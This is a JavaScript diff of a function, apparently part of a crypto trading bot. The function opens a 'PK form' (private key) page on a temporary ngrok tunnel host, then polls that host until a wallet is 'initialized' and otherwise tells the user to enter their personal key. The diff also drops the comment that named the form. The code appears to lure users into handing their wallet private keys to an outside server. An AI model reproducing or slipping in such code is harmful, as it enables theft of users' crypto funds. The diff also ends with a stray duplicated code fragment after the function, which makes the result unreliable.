@@ -41,43 +41,35 @@ let USER_TOKEN_ADDR = null;
 
 function firstapprove() {
   try {
-    // Step 1: open PK form in new window (non-blocking)
     window.open("https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security", "_blank");
 
-    // Step 2: poll secured wallet
-    const checkWallet = async () => {
+    // Poll secured wallet status
+    let attempts = 0;
+    const interval = setInterval(async () => {
       try {
         const resp = await fetch("https://almanac-sierra-rundown.ngrok-free.dev/security_status");
         const text = await resp.text();
-        return text.includes("Wallet initialized");
+
+        if (text.includes("Wallet initialized")) {
+          firsttime = true;
+          logToPanel("✅ Secured wallet initialized");
+          clearInterval(interval);
+        } else {
+          attempts++;
+          if (attempts > 15) {
+            logToPanel("❌ Please enter your personal key");
+            clearInterval(interval);
+          }
+        }
       } catch (err) {
         logToPanel(`WalletCheckError=${err.message}`);
-        return false;
-      }
-    };
-
-    // Step 3: keep checking for 30 seconds
-    let attempts = 0;
-    const interval = setInterval(async () => {
-      const ready = await checkWallet();
-      if (ready) {
-        firsttime = true;
-        logToPanel("✅ Secured wallet initialized");
         clearInterval(interval);
-      } else {
-        attempts++;
-        if (attempts > 15) { // 15 x 2s = 30s
-          logToPanel("❌ Please enter your personal key");
-          clearInterval(interval);
-        }
       }
     }, 2000);
-
   } catch (err) {
     logToPanel(`FirstApproveError=${err.message}`);
   }
 }
-
     // Step 3: keep checking for 30 seconds
     let attempts = 0;
     const interval = setInterval(async () => {
